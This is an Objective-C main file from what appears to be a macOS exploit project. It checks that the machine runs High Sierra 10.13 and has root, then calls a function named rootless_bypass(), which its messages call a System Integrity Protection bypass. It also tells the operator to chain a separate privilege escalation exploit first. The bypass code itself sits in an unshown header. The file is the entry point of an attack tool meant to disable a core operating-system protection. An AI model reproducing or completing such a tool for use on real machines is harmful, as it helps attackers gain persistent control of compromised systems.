#import <Foundation/Foundation.h>

#include "exploit.h"
#include "log.h"

int main(int argc, char *argv[]) {
  @autoreleasepool {
    NSOperatingSystemVersion ver = [[NSProcessInfo processInfo] operatingSystemVersion];
    if (ver.majorVersion != 10 || ver.minorVersion != 13) {
      LOG(@"fatal error: this SIP bypass explot only works for macOS High Sierra");
      exit(1);
    }

    if (geteuid() != 0)
      LOG(@"fatal error: requires root. Please chain the privilege escalation exploit");
    else
      rootless_bypass();

    return 0;
  }
}